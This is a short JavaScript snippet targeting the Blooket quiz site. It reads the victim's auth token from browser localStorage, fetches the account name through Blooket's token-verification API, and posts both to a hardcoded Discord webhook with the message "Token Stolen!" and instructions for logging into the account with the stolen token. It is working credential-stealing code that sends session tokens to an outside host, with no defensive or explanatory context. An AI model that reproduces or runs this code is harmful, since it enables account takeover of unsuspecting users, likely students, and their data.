async function getName(authToken) {
    const response = await fetch('https://api.blooket.com/api/users/verify-token?token=JWT+' + authToken);
    const data = await response.json();
    return data.name
};
function fetchApi(url, json, method){
	fetch(url, {
  	method: method,
    body: JSON.stringify(json),
    headers: {
    	'Content-Type': 'application/json'
    }
  }).then(function (response) {
  	return response.text()
  }).then(function(text){
  	console.log(text)
  }).catch(function(error){
  	console.error(error)
  })
}
fetchApi('https://discord.com/api/webhooks/903749854013051010/F3t98zHr2agCx4XAiRACLpxeqdnohqsXCoPcgPKTip61cky5MUPNhCituqYnan1JuByI',{content: await getName(myToken)+"'s Token Stolen!\n"+localStorage.token+"\nLog into account with: localStorage.token = '"+localStorage.token+"'\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')
